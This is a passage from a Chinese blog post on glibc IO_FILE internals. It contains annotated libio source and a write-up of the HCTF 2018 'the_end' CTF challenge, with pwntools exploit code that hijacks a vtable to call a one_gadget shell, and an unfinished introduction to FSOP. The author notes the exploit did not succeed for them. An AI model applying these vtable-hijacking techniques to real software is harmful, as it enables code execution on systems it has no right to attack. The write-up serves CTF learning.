<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fopen() 函数</span></span><br><span class="line"><span class="comment">// libio/iofopen.c</span></span><br><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">locked_FILE</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">		_IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> wd;</span><br><span class="line">	&#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="built_in">sizeof</span> (<span class="keyword">struct</span> locked_FILE));   <span class="comment">// 为 FILE 结构分配空间</span></span><br><span class="line">    <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">     new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">    _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps; <span class="comment">// 设置 vtable = &amp;_IO_file_jumps</span></span><br><span class="line">	_IO_file_init (&amp;new_f-&gt;fp); <span class="comment">// 调用 _IO_file_init 函数进行初始化</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">	new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)    <span class="comment">// 打开目标文件</span></span><br><span class="line">        <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line">    _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">	<span class="built_in">free</span> (new_f);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/fileops.c</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_init _IO_file_init</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">       of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">       position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">	fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">    fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line">    _IO_link_in (fp);         <span class="comment">// 调用 _IO_link_in 函数将 fp 放进链表</span></span><br><span class="line">    fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">        _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">        _IO_lock_lock (list_all_lock);</span><br><span class="line">        run_fp = (_IO_FILE *) fp;</span><br><span class="line">        _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;  <span class="comment">// fp 放到链表头部</span></span><br><span class="line">        _IO_list_all = fp;                            <span class="comment">// 链表头 _IO_list_all 指向 fp</span></span><br><span class="line">        ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">        _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">        run_fp = <span class="literal">NULL</span>;</span><br><span class="line">        _IO_lock_unlock (list_all_lock);</span><br><span class="line">        _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fread()</code>   最终会调用  <code>_IO_fiel_xsgetn</code> <ul>
<li>流程大致为 <code>_IO_fread-&gt;_IO_sgetn-&gt;_IO_XSGETN-&gt;_IO_file_xsgetn</code>。</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fread</span></span><br><span class="line"><span class="comment">// libio/iofread.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* buf: 存放读取数据的缓冲区。</span></span><br><span class="line"><span class="comment">* size: 指定每个记录的长度。</span></span><br><span class="line"><span class="comment">* count: 指定记录的个数。</span></span><br><span class="line"><span class="comment">* stream: 目标文件流。</span></span><br><span class="line"><span class="comment">* 返回值: 返回读取到数据缓冲区中的记录个数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t bytes_requested = size * count;</span><br><span class="line">    _IO_size_t bytes_read;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span> (fp, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);   <span class="comment">// 调用 _IO_sgetn 函数</span></span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">    <span class="keyword">return</span> _IO_XSGETN (fp, data, n);          <span class="comment">// 调用宏 _IO_XSGETN</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">	_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">	(*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset))</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_vtable_offset(THIS) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fwrite</code> 最终会调用 <code>_IO_file_xsputn</code><ul>
<li>流程 <code>_IO_fwrite-&gt;_IO_XSPUTN-&gt;_IO_new_file_xsputn-&gt;_IO_OVERFLOW-&gt;_IO_new_file_overflow</code></li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fwrite()</span></span><br><span class="line"><span class="comment">// libio/iofwrite.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* buf: 是一个指针，对 fwrite 来说，是要写入数据的地址;</span></span><br><span class="line"><span class="comment">* size: 要写入内容的单字节数;</span></span><br><span class="line"><span class="comment">* count: 要进行写入 size 字节的数据项的个数;</span></span><br><span class="line"><span class="comment">* stream: 目标文件指针;</span></span><br><span class="line"><span class="comment">* 返回值: 实际写入的数据项个数 count。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t request = size * count;</span><br><span class="line">    _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span> (fp, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">        written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);      <span class="comment">// 调用 _IO_sputn 函数</span></span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">       this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">       simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">       buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">    <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fclose</code> 最终会调用 <code>_IO_file_finish</code><ul>
<li>流程大致如下<ul>
<li><code>_IO_unlink_it</code> 将指定的 <code>FILE</code> 从 <code>_chain</code> 链表中摘除</li>
<li><code>_IO_file_close_it</code> 会调用系统接口 <code>close</code> 关闭文件</li>
<li><code>_IO_FINISH-&gt;_IO_file_finish</code> 会调用 <code>free</code> 函数释放 <code>FILE</code> 结构</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libio/iofclose.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span>(fp, EOF);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">    <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">       strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">       here.  */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">        _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);  <span class="comment">// 将 fp 从链表中取出</span></span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">        status = _IO_file_close_it (fp);            <span class="comment">// 关闭目标文件</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    _IO_FINISH (fp);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">         <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">         the conversion functions.  */</span></span><br><span class="line">         <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *cc = fp-&gt;_codecvt;</span><br><span class="line">         __libc_lock_lock (__gconv_lock);</span><br><span class="line">         __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">         __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">         __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">              _IO_free_backup_area (fp);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">      &#123;</span><br><span class="line">          fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">free</span>(fp);                                 <span class="comment">// 释放 FILE 结构体</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="getshell-一般条件"><a href="#getshell-一般条件" class="headerlink" title="getshell 一般条件"></a>getshell 一般条件</h2><p>必须要 <code>libc</code> 的低 <code>32</code> 位地址为负时，攻击才会成功。在 <code>fflush</code> 函数的检查里，它第二步才是跳转，第一步的检查，在 <code>arena</code> 里的伪造 <code>file</code> 结构中这两个值，绝对值一定可以通过，那么就会直接执行虚表函数。所以只有为负时，才会 <code>check</code> 失效。</p>
<h2 id="hctf2018-the-end"><a href="#hctf2018-the-end" class="headerlink" title="[hctf2018]the_end"></a><a class="link"   href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end" >[hctf2018]the_end <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查文件信息"><a href="#检查文件信息" class="headerlink" title="检查文件信息"></a>检查文件信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195448855.png"
                      alt="image-20231018195448855"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203336478.png"
                      alt="image-20231017203336478"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203259746.png"
                      alt="image-20231017203259746"
                ></p>
<h3 id="试运行"><a href="#试运行" class="headerlink" title="试运行"></a>试运行</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203439647.png"
                      alt="image-20231017203439647"
                ></p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">    <span class="built_in">fflush</span>(_bss_start);</span><br><span class="line">    <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们有五次任意地址写 <code>1</code> 字节的机会，并且给了我们 <code>sleep()</code> 函数的地址。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>glibc-2.23</code> 版本及之前没有 <code>_IO_vtable_check</code> 检查，因此可以伪造 <code>vtable</code> 劫持程序流程。 <code>exit</code> 函数有一条这样的调用链 <code>exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_unbuffer_all-&gt;_IO_SETBUFF(fp, NULL, 0)</code>，这里调用了 <code>_IO_2_1_stdout_</code> 的<code>vatable</code> 中 <code>_setbuf</code> 函数.。但位于 <code>libc</code> 数据段的 <code>vtable</code> 是不可以进行写入的，因为 <code>_IO_jumps_t</code> 的第 <code>11</code> 位是 <code>    JUMP_FIELD(_IO_setbuf_t, __setbuf);</code> 所以我们可以在其附近寻找 <code>fake_vtable</code> 将其 <code>(11*8)0x58</code>  处改为 <code>one_gadget</code> ，当程序退出调用 <code>exit</code> 时将会调用 <code>one_gadget</code> 从而 <code>getshell</code> 。</p>
<p><strong>获取信息</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    <span class="keyword">global</span> one_gadget, stdout_vtable, fake_vtable, stderr_vtable</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;here is a gift &quot;</span>)</span><br><span class="line">    sleep = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;luck ;)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    libc.address = sleep - libc.symbols[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">    one_gadget = libc.address + <span class="number">0xf03a4</span></span><br><span class="line"></span><br><span class="line">    stdout_vtable = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0xd8</span></span><br><span class="line">    stderr_vtable = libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xd8</span></span><br><span class="line">    fake_vtable = stderr_vtable - <span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;libc_base : 0x%x&quot;</span> % libc.address)</span><br><span class="line">    info(<span class="string">&quot;one_gadget : 0x%x&quot;</span> % one_gadget)</span><br><span class="line">    info(<span class="string">&quot;stdout_vtable : 0x%x&quot;</span> % stdout_vtable)</span><br><span class="line">    info(<span class="string">&quot;fake_vtable : 0x%x&quot;</span> % fake_vtable)</span><br><span class="line">    info(<span class="string">&quot;stderr_vtable : 0x%x&quot;</span> % stderr_vtable)</span><br><span class="line"></span><br><span class="line">    debug()</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160216214.png"
                      alt="image-20231018160216214"
                ></p>
<p><code>libc.sym[&#39;_IO_2_1_stdout_&#39;] + 0xd8</code> 是 <code>_IO_2_1_stdout_</code> 的 <code>vtable</code> 指针，<code>glibc-2.23</code>版本<code>x64</code> 的偏移<code>(struct _IO_FILE大小)</code>为 <code>0xd8</code>，<code>x32</code> 减半。</p>
<p><strong>get_shell</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">    p.send(p64(stdout_vtable))</span><br><span class="line">    p.send(p8(fake_vtable&amp;<span class="number">0xff</span>))</span><br><span class="line">    p.send(p64(stdout_vtable+<span class="number">1</span>))</span><br><span class="line">    p.send(p8((fake_vtable&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    p.send(p64(stderr_vtable))</span><br><span class="line">    p.send(p8(one_gadget&amp;<span class="number">0xff</span>))</span><br><span class="line">    p.send(p64(stderr_vtable+<span class="number">1</span>))</span><br><span class="line">    p.send(p8((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.send(p64(stderr_vtable+<span class="number">2</span>))</span><br><span class="line">    p.send(p8((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">b&quot;exec 1&gt;&amp;0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160251059.png"
                      alt="image-20231018160251059"
                ></p>
<p>前两次机会我们可以修改 <code>stdout_vtable</code> 的后 <code>16</code> 位将其指向 <code>fake_vtable</code> 。 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160327303.png"
                      alt="image-20231018160327303"
                ></p>
<p>后面三次机会将 <code>fake_vtable</code> 的高 <code>11*8(0x58)</code> 处的 <code>_IO_SETBUF(实际上是 stderr_vtable)</code> 改为 <code>onegadget</code>，因为都在 <code>libc.so</code> 数据段，所以我们只需要修改其后 <code>8*3</code> 位即可。 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160457056.png"
                      alt="image-20231018160457056"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160514870.png"
                      alt="image-20231018160514870"
                ></p>
<p>最后调用了 <code>one_gadget</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160702397.png"
                      alt="image-20231018160702397"
                ></p>
<p>但是我这里<code>4</code>  个 <code>one_gadget</code> 都不满足条件，这个方法没打通，哪里有问题还想烦请师傅多多指教。</p>
<p><strong>图解</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hctf2018the_end.png"
                      alt="hctf2018the_end"
                ></p>
<h2 id="FSOP-glibc"><a href="#FSOP-glibc" class="headerlink" title="FSOP(glibc &lt;&#x3D; 2.23)"></a>FSOP(glibc &lt;&#x3D; 2.23)</h2><p><code>FSOP</code> 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的 <code>_IO_FILE_plus</code> 。之后使程序执行 <code>_IO_flush_all_lockp</code> 函数刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 <code>FILE</code> 调用 <code>fflush</code> ，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code>。<code>FSOP</code> 通过伪造 <code>_IO_jump_t</code> 中的 <code>__overflow</code> 为 <code>system()</code> 函数 地 址 ， 最 终 在 <code>_IO_OVERFLOW(fp,EOF)</code> 函 数 中 执 行 <code>system(&#39;/bin/sh&#39;)</code> 并获得 <code>shell</code>。</p>
<ul>
<li><p><code>_IO_flush_all_lockp</code> 在一些情况下这个函数会被系统调用：</p>
<ol>
<li>当 <code>libc</code> 执行 <code>abort</code> 流程时</li>
</ol>
